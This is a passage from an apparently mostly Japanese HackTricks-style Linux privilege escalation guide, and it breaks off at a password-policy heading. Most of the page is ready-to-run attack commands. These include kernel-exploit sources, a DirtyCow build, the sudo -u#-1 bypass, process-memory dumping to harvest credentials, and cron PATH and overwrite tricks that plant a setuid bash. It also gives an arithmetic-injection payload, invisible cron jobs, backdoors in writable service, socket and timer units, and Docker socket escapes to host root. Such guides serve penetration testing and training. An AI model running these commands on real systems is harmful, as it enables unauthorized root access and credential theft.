# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## システム情報

### OS 情報

実行中のOSについての情報収集を始めましょう。
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### パス

もし **`PATH` 変数内の任意のフォルダに書き込み権限がある** 場合、いくつかの libraries や binaries を hijack できる可能性があります:
```bash
echo $PATH
```
### 環境情報

環境変数に興味深い情報、パスワード、または API キーはありますか？
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

kernel version を確認し、privilege escalation に使える exploit がないか調べる。
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
良い脆弱なカーネルのリストと、すでに**compiled exploits**がいくつか見つかる場所: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
その他で**compiled exploits**が見つかるサイト: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

そのウェブからすべての脆弱なカーネルバージョンを抽出するには:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
kernel exploits を検索するのに役立つツールは:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (ターゲット上で実行。kernel 2.x の exploit のみをチェックします)

Always **kernel version を Google で検索**。お使いの kernel version が既存の kernel exploit に明記されていることがあり、その場合はその exploit が有効であると確信できます。

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo バージョン

次に示す脆弱な sudo バージョンに基づいて:
```bash
searchsploit sudo
```
このgrepを使ってsudoのバージョンが脆弱かどうかを確認できます。
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

提供: @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg: 署名検証に失敗

この **vuln** がどのように悪用されるかの **例** については、**smasher2 box of HTB** を確認してください。
```bash
dmesg 2>/dev/null | grep "signature"
```
### さらなるシステム列挙
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 可能な防御を列挙する

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

docker container の中にいる場合、そこから脱出を試みることができます:

{{#ref}}
docker-security/
{{#endref}}

## ドライブ

**何がマウントされていてアンマウントされているか**、どこにあり、なぜなのかを確認してください。もし何かがアンマウントされているなら、それをマウントしてプライベートな情報を確認してみてください。
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 有用なソフトウェア

有用な binaries を列挙する
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
また、**any compiler is installed**かどうかを確認してください。これは、いくつかの kernel exploit を使用する必要がある場合に有用です。使用するマシン（または類似のマシン）上でコンパイルすることが推奨されているためです。
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### 脆弱なソフトウェアがインストールされているか

**インストールされているパッケージやサービスのバージョン**を確認してください。例えば古いNagiosのバージョンが存在し、それが exploited for escalating privileges…\
より疑わしいインストール済みソフトウェアのバージョンは手動で確認することを推奨します。
```bash
dpkg -l #Debian
rpm -qa #Centos
```
マシンにSSHでアクセスできる場合、マシン内にインストールされている古く脆弱なソフトウェアを確認するために **openVAS** を使用することもできます。

> [!NOTE] > _注意：これらのコマンドは大量の情報を表示し、その大部分はほとんど役に立たないため、OpenVASのようにインストールされているソフトウェアのバージョンが既知のexploitsに対して脆弱かどうかをチェックするアプリケーションの使用を推奨します_

## プロセス

どのプロセスが実行されているかを確認し、特定のプロセスが **本来あるべきより多くの権限** を持っていないかをチェックしてください（例えば tomcat が root によって実行されているかもしれません）。
```bash
ps aux
ps -ef
top -n 1
```
常に[**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md)が実行されている可能性を確認してください。**Linpeas**はプロセスのコマンドライン内の`--inspect`パラメータをチェックしてそれらを検出します。\
また、**プロセスのバイナリに対する権限を確認してください**。誰かを上書きできるかもしれません。

### プロセス監視

プロセスを監視するために[**pspy**](https://github.com/DominicBreuker/pspy)のようなツールを使用できます。頻繁に実行される、または特定の条件が満たされたときに脆弱なプロセスを特定するのに非常に役立ちます。

### プロセスメモリ

一部のサービスはメモリ内に**メモリ内に平文で保存されたcredentials**を保存します。\
通常、他のユーザーに属するプロセスのメモリを読み取るには**root privileges**が必要です。したがって、これは通常、すでにrootでさらに多くのcredentialsを発見したいときにより有用です。\
ただし、**通常ユーザーとしては自分が所有するプロセスのメモリを読み取ることができる**ことを忘れないでください。

> [!WARNING]
> 最近のほとんどのマシンはデフォルトでptraceを許可していないことに注意してください。これは、非特権ユーザーが所有する他のプロセスをダンプできないことを意味します。
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

例えばFTPサービスのメモリにアクセスできる場合、Heapを取得してその内部のcredentialsを検索できます。
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB スクリプト
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

指定したプロセスIDについて、**maps はそのプロセスの仮想アドレス空間内でメモリがどのようにマッピングされているかを示し**、また各マッピング領域の**権限を表示します**。  
**mem** 疑似ファイルは、**プロセスのメモリそのものを公開します**。  
**maps** ファイルから、どの**メモリ領域が読み取り可能であるか**、およびそれらのオフセットが分かります。  
この情報を用いて、**mem ファイル内をシークして読み取り可能なすべての領域を dump し、ファイルに保存します**。
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` はシステムの**物理**メモリへのアクセスを提供し、仮想メモリではありません。  
カーネルの仮想アドレス空間には /dev/kmem を使ってアクセスできます.\\
通常、`/dev/mem` は **root** および **kmem** グループのみが読み取り可能です。
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump は、Windows 向け Sysinternals スイートにある古典的な ProcDump ツールを Linux 向けに再構想したものです。入手先: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### ツール

プロセスのメモリをダンプするには、次を使用できます:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_手動でrootの要件を取り除き、自分が所有するプロセスをダンプできます
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root が必要)

### プロセスのメモリからの資格情報

#### 手動の例

authenticatorプロセスが実行されていることを確認した場合:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
processをdumpして（前のセクションを参照して、processのmemoryをdumpするさまざまな方法を確認してください）memory内からcredentialsを検索できます:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

このツール [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) はメモリやいくつかの既知のファイルから平文の資格情報を盗みます。正常に動作させるにはroot権限が必要です。

| 機能                                              | プロセス名            |
| ------------------------------------------------- | ---------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password           |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon   |
| LightDM (Ubuntu Desktop)                          | lightdm                |
| VSFTPd (Active FTP Connections)                   | vsftpd                 |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2                |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                  |

#### 検索用正規表現/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## スケジュールされた/Cron jobs

スケジュールされたジョブが脆弱かどうか確認する。rootで実行されるscriptを利用できるかもしれない（wildcard vuln? rootが使用するファイルを変更できるか? symlinksを使う? rootが使用するディレクトリに特定のファイルを作成する?）。
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

例えば、_/etc/crontab_ の中で次のような PATH を見つけることができます: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_ユーザー "user" が /home/user に書き込み権限を持っていることに注意してください_)

この crontab の中で root ユーザーが PATH を設定せずにコマンドやスクリプトを実行しようとした場合。例えば: _\* \* \* \* root overwrite.sh_\
その場合、次のようにして root shell を取得できます:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron ワイルドカードを含むスクリプトを使用する (Wildcard Injection)

もし root によって実行されるスクリプト内のコマンドに “**\***” が含まれている場合、これを悪用して予期しない動作（privesc など）を引き起こすことができます。例:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**If the wildcard が _**/some/path/\***_ のようなパスの前にある場合、それは脆弱ではありません（_**./\***_ も同様に脆弱ではありません）。**

より多くの wildcard exploitation tricks については次のページを参照してください：


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash は ((...)), $((...)) および let 内での arithmetic evaluation の前に parameter expansion と command substitution を実行します。もし root cron/parser が untrusted log fields を読み取り、それらを arithmetic context に渡すと、attacker は cron 実行時に root として実行される command substitution $(...) を注入できます。

- 理由: Bash では expansions は次の順序で発生します: parameter/variable expansion, command substitution, arithmetic expansion, その後 word splitting と pathname expansion。したがって `$(/bin/bash -c 'id > /tmp/pwn')0` のような値はまず substitution (コマンド実行) され、残った数値の `0` が arithmetic に使われるためスクリプトはエラーなく続行します。

- 典型的な脆弱なパターン:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- 悪用方法: parsed log に attacker-controlled なテキストを書き込み、数字に見えるフィールドが command substitution を含み末尾が数字になるようにします。コマンドが stdout に出力しない（またはリダイレクトする）ようにして、arithmetic が有効なままであることを確認してください。
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

If you **can modify a cron script** executed by root, you can get a shell very easily:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
rootによって実行されるスクリプトが**あなたが完全にアクセスできるディレクトリ**を使用している場合、そのフォルダを削除して、**あなたが制御するスクリプトを提供する別の場所へ向けたsymlinkフォルダを作成する**ことが有効かもしれません。
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### 頻繁な cron jobs

プロセスを監視して、1分、2分、5分ごとに実行されているプロセスを探すことができます。これを利用して、escalate privileges できるかもしれません。

例えば、**1分間、0.1秒ごとに監視する**, **実行回数の少ないコマンドでソートする**、そして最も多く実行されたコマンドを削除するには、次のようにできます:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**また使用できます** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (これは起動するすべてのプロセスを監視して一覧表示します)。

### 見えない cron jobs

コメントの後に**キャリッジリターンを入れる**（改行文字ではなく）ことでcronjobを作成でき、そのcron jobは動作します。例（キャリッジリターンに注意）:
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## サービス

### 書き込み可能な _.service_ ファイル

任意の `.service` ファイルに書き込み可能か確認してください。書き込みできる場合、そのファイルを **could modify it** して、サービスが **started**, **restarted** または **stopped** のときにあなたの **backdoor** を **executes** するようにできます（場合によってはマシンの再起動を待つ必要があります）。\
例えば、.service ファイル内にあなたの **backdoor** を **`ExecStart=/tmp/script.sh`** のように作成します。

### 書き込み可能な service binaries

サービスによって実行される **binaries** に対して **write permissions over binaries being executed by services** を持っている場合、それらを書き換えて backdoors を仕込むことができるため、サービスが再実行されたときに backdoors が実行されます。

### systemd PATH - 相対パス

次のコマンドで **systemd** が使用する PATH を確認できます:
```bash
systemctl show-environment
```
パスのいずれかのフォルダに**write**できることが分かれば、**escalate privileges**できる可能性があります。サービスの設定ファイルで**relative paths being used on service configurations**のような記述がないかを探す必要があります:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
その後、書き込み可能な systemd PATH フォルダ内に、**executable** を **same name as the relative path binary** として作成し、サービスが脆弱なアクション（**Start**, **Stop**, **Reload**）を要求されたときに、あなたの **backdoor will be executed**（unprivileged users は通常サービスを start/stop できませんが、`sudo -l` を使えるか確認してください）。

**サービスについては `man systemd.service` を参照してください。**

## **タイマー**

**タイマー** は名前が `**.timer**` で終わる systemd unit ファイルで、`**.service**` ファイルやイベントを制御します。**タイマー** はカレンダー時間イベントや単調時間イベントの組み込みサポートがあり、非同期に実行できるため、cron の代替として使用できます。

すべてのタイマーは次のコマンドで列挙できます:
```bash
systemctl list-timers --all
```
### 書き込み可能な timers

もし timer を変更できれば、systemd.unit（`.service` や `.target` のような既存のユニット）を実行させることができます。
```bash
Unit=backdoor.service
```
> タイマーが満了したときにアクティブにする unit。引数は unit 名で、その接尾辞は ".timer" ではありません。指定がない場合、この値はタイマー unit と同じ名前で、接尾辞だけが異なる .service にデフォルトされます。（上記を参照）起動される unit 名とタイマー unit の unit 名は、接尾辞を除いて同一にすることが推奨されます。
> 
> 

したがって、この権限を悪用するには次のことが必要です:

- systemd unit（例: `.service`）のうち、**書き込み可能なバイナリを実行している**ものを見つける
- **相対パスで実行している** systemd unit を見つけ、**systemd PATH** に対して **書き込み権限** を持っている（その実行ファイルを偽装するため）

**Learn more about timers with `man systemd.timer`.**

### **タイマーの有効化**

タイマーを有効化するには root 権限が必要で、以下を実行します:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) はクライアント-サーバモデル内で、同一または異なるマシン間の**プロセス間通信**を可能にします。これらは標準の Unix デスクリプタファイルを利用してコンピュータ間通信を行い、`.socket` ファイルを通じて設定されます。

Sockets can be configured using `.socket` files.

**sockets については `man systemd.socket` を参照してください。** このファイル内では、いくつか興味深いパラメータを設定できます：

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: これらのオプションは異なりますが、要約するとソケットがどこでリッスンするか（AF_UNIX ソケットファイルのパス、IPv4/6 や待ち受けるポート番号など）を**示す**ために使われます。
- `Accept`: ブール値を取ります。`true` の場合、**各着信接続ごとにサービスインスタンスが生成され**、接続ソケットのみが渡されます。`false` の場合、すべてのリッスンソケット自体が**起動された service unit に渡され**、すべての接続に対して単一の service unit だけが生成されます。この値は datagram ソケットや FIFO では無視され、これらでは単一の service unit が無条件にすべての着信トラフィックを処理します。**Defaults to false**。パフォーマンス上の理由から、新しいデーモンは `Accept=no` に適した方式で書くことが推奨されます。
- `ExecStartPre`, `ExecStartPost`: 1つ以上のコマンドラインを取り、それらはそれぞれリッスンする**ソケット**/FIFO が**作成**されバインドされる**前**または**後**に実行されます。コマンドラインの最初のトークンは絶対ファイル名である必要があり、その後にプロセスの引数が続きます。
- `ExecStopPre`, `ExecStopPost`: リッスンする**ソケット**/FIFO が閉じられ削除される**前**または**後**に実行される追加の**コマンド**です。
- `Service`: 着信トラフィックに対して**有効化する**`service` unit の名前を指定します。この設定は `Accept=no` のソケットでのみ許可されます。デフォルトではソケットと同名のサービス（サフィックスを置き換えたもの）になります。ほとんどの場合、このオプションを使用する必要はありません。

### Writable .socket files

If you find a **writable** `.socket` file you can **add** at the beginning of the `[Socket]` section something like: `ExecStartPre=/home/kali/sys/backdoor` and the backdoor will be executed before the socket is created. Therefore, you will **probably need to wait until the machine is rebooted.**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

もし書き込み可能な `.socket` ファイルを見つけたら、`[Socket]` セクションの冒頭に `ExecStartPre=/home/kali/sys/backdoor` のような行を**追加**できます。こうするとソケットが作成される前にバックドアが実行されます。したがって、**多くの場合マシンの再起動を待つ必要があるでしょう。**\
_システムがその socket ファイルの設定を実際に使用している必要があり、使用していない場合はバックドアは実行されません_

### Writable sockets

If you **identify any writable socket** (_now we are talking about Unix Sockets and not about the config `.socket` files_), then **you can communicate** with that socket and maybe exploit a vulnerability.

もし書き込み可能なソケットを**発見した**場合（_ここで言うソケットは設定ファイルの `.socket` ではなく Unix Sockets のことです_）、そのソケットと**通信する**ことができ、脆弱性を悪用できる可能性があります。

### Unix Sockets を列挙する
```bash
netstat -a -p --unix
```
### 生の接続
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation の例:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

注意: 一部に **sockets listening for HTTP** リクエストがある場合があります（_ここで言っているのは .socket ファイルではなく、unix sockets として動作するファイルのことです_）。これを確認するには:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
ソケットが **HTTP リクエストに応答する** 場合、そこに **通信** でき、場合によっては **exploit some vulnerability**。

### 書き込み可能な Docker Socket

The Docker socket, often found at `/var/run/docker.sock`, is a critical file that should be secured. By default, it's writable by the `root` user and members of the `docker` group. Possessing write access to this socket can lead to privilege escalation. Here's a breakdown of how this can be done and alternative methods if the Docker CLI isn't available.

#### **Privilege Escalation with Docker CLI**

If you have write access to the Docker socket, you can escalate privileges using the following commands:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
これらのコマンドを使うと、ホストのファイルシステムに対して root権限でアクセスできるコンテナを実行できます。

#### **Docker API を直接使用する場合**

Docker CLI が利用できない場合でも、Docker API と `curl` コマンドを使って Docker ソケットを操作できます。

1.  **Docker イメージの一覧:** 利用可能なイメージのリストを取得します。

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **コンテナの作成:** ホストシステムのルートディレクトリをマウントするコンテナを作成するリクエストを送信します。

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

作成したコンテナを起動します:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **コンテナにアタッチする:** `socat` を使ってコンテナへの接続を確立し、その中でコマンドを実行できるようにします。

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat` 接続を確立すると、コンテナ内でホストのファイルシステムに対して root権限で直接コマンドを実行できます。

### その他

docker ソケットへの書き込み権限を持っている（**group `docker` のメンバーである**）場合は、[**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group) が利用可能になることに注意してください。もし [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising)。

Docker からの脱出や悪用による権限昇格の他の方法については、次を参照してください:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) の権限昇格

もし **`ctr`** コマンドを実行できることが分かった場合、次のページを参照してください。**権限昇格に悪用できる可能性があります**：


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** の権限昇格

もし **`runc`** コマンドを使用できる場合、次のページを参照してください。**権限昇格に悪用できる可能性があります**：


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus は高度な inter-Process Communication (IPC) システムで、アプリケーション間の効率的な相互作用とデータ共有を可能にします。現代の Linux システムを念頭に設計されており、さまざまな形式のアプリケーション間通信に対して堅牢なフレームワークを提供します。

このシステムは柔軟性があり、プロセス間のデータ交換を強化する基本的な IPC をサポートしており、拡張された UNIX ドメインソケットを連想させます。さらに、イベントやシグナルのブロードキャストを助け、システムコンポーネント間のシームレスな統合を促進します。例えば、Bluetooth デーモンからの着信通知が音楽プレーヤーをミュートさせるといったユーザー体験の向上が可能です。加えて、D-Bus はリモートオブジェクトシステムをサポートしており、アプリケーション間のサービス要求やメソッド呼び出しを簡素化し、従来は複雑だったプロセスを効率化します。

D-Bus は **allow/deny モデル** で動作し、ポリシールールのマッチに基づく累積的な効果によりメッセージ権限（メソッド呼び出し、シグナル送出など）を管理します。これらのポリシーはバスとのやり取りを指定し、その権限の悪用によって権限昇格が可能になる場合があります。

そのようなポリシーの例が `/etc/dbus-1/system.d/wpa_supplicant.conf` に示されており、root ユーザーが `fi.w1.wpa_supplicant1` を所有し、送信し、受信する権限の詳細が記載されています。

ユーザーやグループが明示されていないポリシーは全体に適用され、"default" コンテキストのポリシーは他の特定のポリシーでカバーされていないすべてに適用されます。
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**ここでD-Bus communicationの列挙とエクスプロイト方法を学べます：**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **ネットワーク**

ネットワークを列挙してマシンの位置を把握するのは常に興味深い。

### 一般的な列挙
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Open ports

アクセスする前に操作できなかったマシン上で動作しているネットワークサービスは常に確認してください:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

sniff traffic が可能か確認してください。可能であれば、credentials を取得できるかもしれません。
```
timeout 1 tcpdump
```
## ユーザー

### 一般的な列挙

自分が**誰**か、どの**権限**を持っているか、システムにどの**ユーザー**が存在するか、どのユーザーが**ログイン**できるか、どのユーザーが**root権限**を持っているかを確認する:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### 大きな UID

一部の Linux バージョンは、**UID > INT_MAX** のユーザーが権限昇格できるバグの影響を受けていました。詳細: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**これを悪用するには**: **`systemd-run -t /bin/bash`**

### グループ

root 権限を付与する可能性のある**グループのメンバー**かどうか確認してください:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### クリップボード

可能であれば、クリップボードの中に興味深いものがないか確認してください
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### パスワードポリシー
```bash
